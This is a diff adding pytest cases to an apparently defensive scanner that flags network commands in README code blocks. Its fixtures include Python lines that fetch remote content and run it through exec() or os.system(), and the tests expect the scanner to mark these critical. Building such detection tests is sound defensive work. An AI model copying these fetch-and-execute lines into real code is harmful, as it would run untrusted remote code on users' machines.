@@ -1103,6 +1103,61 @@ git clone https://github.com/example-org/model.git
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_github_clone_cd_then_setup_remains_actionable(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+git clone https://github.com/example-org/model.git
+cd model
+python setup.py install
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_command"
+        and check.details.get("command_type") == "git_clone"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_github_clone_cd_listing_is_informational(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+git clone https://github.com/example-org/model.git
+cd model
+ls
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_command"
+        and check.details.get("command_type") == "git_clone"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
 def test_text_scanner_fenced_documentation_github_clone_does_not_hide_github_download(
     tmp_path: Path,
 ) -> None:
@@ -1429,6 +1484,34 @@ def test_text_scanner_fenced_documentation_passive_media_does_not_hide_executed_
 import requests
 
 exec(requests.get("http://images.cocodataset.org/val2017/000000039769.jpg").text)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_parenthesized_executed_fetch(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import os
+import requests
+
+os.system((requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")).text)
 ```
 """,
         encoding="utf-8",
